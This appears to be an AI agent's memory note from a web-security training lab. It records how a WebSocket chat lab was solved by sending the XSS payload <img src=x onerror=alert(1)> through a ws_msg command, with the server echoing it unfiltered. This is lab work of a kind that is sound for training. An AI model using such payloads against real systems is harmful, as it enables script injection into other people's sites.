---
metadata:
  node_type: memory
name: "Academy Lab Solves"
description: "WebSocket chat lab solved in one ws_msg shot: chat form action reveals wss endpoint, JSON payload <img src=x onerror=alert(1)> echoed raw, banner_verdict confirms solved."
last_updated: 2026-10-10T20:01:06+08:00
created: 2026-10-10T20:01:06+08:00
---

## 2025-02 WebSocket message XSS (websockets/lab-manipulating-messages-to-exploit-vulnerabilities)
- Fresh instance via `range_launch launch-url /web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities --jar /tmp/cj1.json` (lab_id dddbacf...; page_read 取 lab_id 已含在 launch-url 路径解析里).
- Chat form action 直接给 wss endpoint `<wss://HOST>/chat`(http_session get /chat 读出);消息体格式 `{"message":"..."}`。
- 一枪命中:`ws_msg wss://HOST/chat --msg '{"message":"<img src=x onerror=alert(1)>"}' --jar /tmp/cj1.json` → 回帧把 HTML 原样回显,支持代理浏览器渲染即弹窗;`banner_verdict <base>/ --jar` 回 solved_class=true + congrats。属"消息体不过滤 → 存储型 XSS 于服务端代理客户端"族,件面覆盖完整,无需浏览器。

